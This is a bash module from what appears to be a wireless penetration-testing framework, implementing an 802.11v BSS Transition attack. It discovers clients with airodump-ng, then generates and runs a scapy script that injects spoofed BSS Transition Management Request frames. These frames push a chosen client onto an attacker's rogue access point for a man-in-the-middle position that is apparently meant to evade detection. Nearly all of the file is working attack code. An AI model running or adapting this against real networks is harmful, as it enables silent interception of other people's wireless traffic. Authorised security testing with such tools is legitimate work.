#!/usr/bin/env bash
# MODULE_META
# NAME="BSS Transition Attack (802.11v)"
# CATEGORY="G"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="hostapd,python3,scapy"
# DESC="Force clients to transition to a malicious AP using 802.11v BSS Transition Management Requests"
# REQS="monitor_iface,target_ssid,target_bssid"
# PCAP="yes"
# DECODE="wifi_mgmt"

#===============================================================================
#  modules/g5_bss_transition_attack.sh
#  G5: BSS Transition Attack (Golden Wrapper)
#
#  METHODOLOGY:
#  1. Target clients connected to an AP supporting 802.11v.
#  2. Send a 'BSS Transition Management Request' frame to the client.
#  3. The request "recommends" the client move to a new BSSID (our rogue AP).
#  4. This allows for a "polite" MITM attack that does not require deauth
#     and is less likely to be detected by WIDS.
#===============================================================================

set -euo pipefail

# SNR Safeguard (Red Team Hardening)
if [[ "${ASTRA_TARGET_RSSI:-0}" -ne 0 ]] && [[ "${ASTRA_TARGET_RSSI:-0}" -lt -75 ]]; then
    echo -e "\n[!] WARNING: Low Signal Strength Detected (${ASTRA_TARGET_RSSI}dBm)."
    echo "[*] BSS Transition frames are highly likely to be dropped at this distance."
    read -p "[?] Continue anyway? [y/N]: " snr_continue
    [[ "$snr_continue" != "y" ]] && exit 0
fi

# Inputs from Environment
INTERFACE="${MONITOR_INTERFACE:-}"
SSID="${GUEST_SSID:-}"
BSSID="${GUEST_BSSID:-}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="G5"

if [[ -z "$INTERFACE" || -z "$BSSID" ]]; then
    echo "[!] MONITOR_INTERFACE or GUEST_BSSID not set."
    exit 1
fi

echo "[*] Initializing Active BSS Transition (802.11v) Attack against ${BSSID}..."

# 1. Identify clients
echo "[*] Identifying active clients for transition targeting..."
CLIENT_FILE="${EVIDENCE_DIR}/g5_clients.txt"
DISC_PREFIX="${EVIDENCE_DIR}/g5_discovery"
airodump-ng --bssid "$BSSID" --write "$DISC_PREFIX" --output-format csv "$INTERFACE" > /dev/null 2>&1 &
DISC_PID=$!
sleep 15
kill "$DISC_PID" || true
wait "$DISC_PID" 2>/dev/null || true

awk -F',' '/Station/ {f=1;next} f {print $1}' "${DISC_PREFIX}-01.csv" | tr -d ' ' | grep -E '([0-9A-Fa-f]{2}:){5}' > "$CLIENT_FILE" || true

CLIENTS=()
while read -r c; do CLIENTS+=("$c"); done < "$CLIENT_FILE"

if [[ ${#CLIENTS[@]} -eq 0 ]]; then
    echo "[!] No clients discovered on ${BSSID}. Attack aborted."
    exit 0
fi

echo "[?] Select target client for transition:"
for i in "${!CLIENTS[@]}"; do
    echo "    $((i+1))) ${CLIENTS[$i]}"
done
read -p "Selection [1-${#CLIENTS[@]}]: " choice
TARGET_CLIENT="${CLIENTS[$((choice-1))]}"

read -p "[?] Enter Rogue AP BSSID (to transition the client to): " ROGUE_BSSID
if [[ -z "$ROGUE_BSSID" ]]; then
    echo "[!] Rogue BSSID required."
    exit 1
fi

# 2. Execute Active Injection
echo "[*] Injecting 802.11v BSS Transition Management Request..."
PYTHON_INJECTOR="${EVIDENCE_DIR}/g5_inject.py"

cat <<EOF > "$PYTHON_INJECTOR"
from scapy.all import *
import sys

target_client = sys.argv[1]
source_ap = sys.argv[2]
rogue_ap = sys.argv[3]
iface = sys.argv[4]

print(f"[*] Sending BTM Request to {target_client} from {source_ap}...")

# 802.11v BSS Transition Management Request
# Type: Management (0), Subtype: 13 (Action)
# Category: WNM (10), Action: BTM Request (7)
pkt = RadioTap() / Dot11(addr1=target_client, addr2=source_ap, addr3=source_ap) / \
      Dot11Action(category=10, action=7) / \
      Raw(load=b"\x01\x00\x00\x00\x00" + bytes.fromhex(rogue_ap.replace(":", "")))

sendp(pkt, iface=iface, count=10, inter=0.1, verbose=0)
EOF

python3 "$PYTHON_INJECTOR" "$TARGET_CLIENT" "$BSSID" "$ROGUE_BSSID" "$INTERFACE"

# 3. Reporting
echo "[+] BSS transition injection complete."
"$ASTRA_BIN" record-finding \
    --session-dir "$SESSION_DIR" \
    --tc "$TC_ID" \
    --type vulnerability \
    --name "BSS Transition Injection Executed" \
    --severity HIGH \
    --desc "Injected 802.11v BTM Request frames to force client $TARGET_CLIENT to roam to $ROGUE_BSSID." \
    --target "$TARGET_CLIENT" \
    --evidence "$PYTHON_INJECTOR" \
    --rationale "Abusing 802.11v allows for 'silent' Man-in-the-Middle positioning by tricking clients into roaming to attacker-controlled infrastructure without the noise of deauthentication."

exit 0
